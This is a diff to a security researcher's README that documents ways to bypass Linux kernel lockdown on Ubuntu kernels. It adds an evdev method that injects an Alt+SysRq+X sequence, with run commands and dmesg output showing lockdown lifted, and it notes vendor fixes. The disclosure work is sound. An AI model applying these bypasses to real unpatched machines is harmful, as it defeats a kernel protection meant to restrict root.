@@ -3,7 +3,7 @@ unlockdown
 
 This repo demonstrates some ways to disable or bypass kernel lockdown on Ubuntu (and some other) kernels without physical access to the machine, essentially bypassing this security feature.
 
-(Updated 18.02.2019.) At this point, all proposed bypass methods have been fixed on Ubuntu and Fedora.
+(Updated 18.02.2020.) At this point, all proposed bypass methods have been fixed on Ubuntu and Fedora ([Debian](https://github.com/xairy/unlockdown/issues/1) still in progress).
 
 ## Story
 
@@ -26,7 +26,7 @@ Lockdown, eh?
 
 Linux kernel lockdown is a security feature that aims at restricting root's ability to modify the kernel at runtime.
 See more details in ["Kernel lockdown in 4.17?"](https://lwn.net/Articles/750730/) by Jonathan Corbet and ["Linux kernel lockdown and UEFI Secure Boot"](https://mjg59.dreamwidth.org/50577.html) by Matthew Garrett.
-After 2 years of being in review, the lockdown patchset has been [merged](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aefcf2f4b58155d27340ba5f9ddbe9513da8286d) into the upstream kernel in version 5.4.
+After many years of being in review, the lockdown patchset has been [merged](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aefcf2f4b58155d27340ba5f9ddbe9513da8286d) into the upstream kernel in version 5.4.
 Ubuntu has applied [a version of this patchset](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/bionic/commit/?id=49b04f8acc7788778a360e7462353a86eaffca53) to their kernels in 2018.
 
 Lockdown is enabled by default on my ThinkPad X1 Carbon laptop with Ubuntu Bionic:
@@ -103,10 +103,10 @@ Ubuntu's kernels have USB/IP enabled (`CONFIG_USBIP_VHCI_HCD=m` and `CONFIG_USBI
 
 (Jann has also mentioned the Dummy HCD/UDC module, which can indeed by used together with e.g. GadgetFS to do the same trick, but `CONFIG_USB_DUMMY_HCD` is not enabled in Ubuntu kernels.)
 
-[Here](https://github.com/xairy/unlockdown/blob/master/01-usbip/keyboard.c) you can find the code that emulates a keyboard over USB/IP and sends an Alt+SysRq+X key combination. [This script](https://github.com/xairy/unlockdown/blob/master/01-usbip/run.sh) shows how to run it.
+[Here](/01-usbip/keyboard.c) you can find the code that emulates a keyboard over USB/IP and sends an Alt+SysRq+X key combination. [This script](/01-usbip/run.sh) shows how to run it.
 It's possible to simplify the implementation of this method by directly interacting with the VHCI driver to emulate a USB device, but I didn't bother with this.
 
-(Updated 18.02.2019.) This method and has been fixed in [Ubuntu](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1861238) and [Fedora](https://bugzilla.redhat.com/show_bug.cgi?id=1800859) kernels by dropping the "Add a SysRq option to lift kernel lockdown" patch.
+(Updated 18.02.2020.) This method and has been fixed in [Ubuntu](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1861238) and [Fedora](https://bugzilla.redhat.com/show_bug.cgi?id=1800859) kernels by dropping the "Add a SysRq option to lift kernel lockdown" patch.
 
 ```
 # uname -a
@@ -145,7 +145,53 @@ Done! Check dmesg.
 [  423.429612] Lifting lockdown
 ```
 
-### Method 2: TBD
+### Method 2: evdev
+
+(Added 21.03.2020.)
+
+While Ubuntu's backport of the lockdown patchset [disallows](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/bionic/commit/?id=531c25a35b2a93e025e72e04f16b0f3620ace581) injecting input events through `uinput`, it does nothing about `evdev`, that can also be used for input injection as long as you have a connected device that supports the required keys (e.g. a built-in laptop keyboard).
+
+[Here](/02-evdev/evdev-sysrq.c) is the code that finds an appropriate `/dev/input/` device and injects Alt+SysRq+X sequence through it. [Here](/02-evdev/evdev-sysrq.py) is a Python program that does the same.
+
+This method doesn't really give anything on top of the previous one from a practical standpoint, and it's actually fixed by the same patch that drops support for lifting lockdown via SysRq.
+
+```
+# uname -a
+Linux x1 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
+# cd 02-evdev
+# ./run.sh
++ echo 1
++ gcc ./evdev-sysrq.c -o evdev-sysrq
++ ./evdev-sysrq
+checking /dev/input/event0
+EV_KEY supported
+checking /dev/input/event1
+checking /dev/input/event10
+checking /dev/input/event11
+checking /dev/input/event12
+checking /dev/input/event13
+checking /dev/input/event14
+checking /dev/input/event15
+checking /dev/input/event16
+EV_KEY supported
+checking /dev/input/event2
+EV_KEY supported
+checking /dev/input/event3
+EV_KEY supported
+KEY_SYSRQ supported
+EV_SYN supported
+found device /dev/input/event3
+sending Alt+SysRq+X sequence
+done
+
+# dmesg
+...
+[  192.723788] sysrq: SysRq : Disabling Secure Boot restrictions
+[  192.723791] Lifting lockdown
+```
+
+### Method 3: TBD
 
 TBD.
 
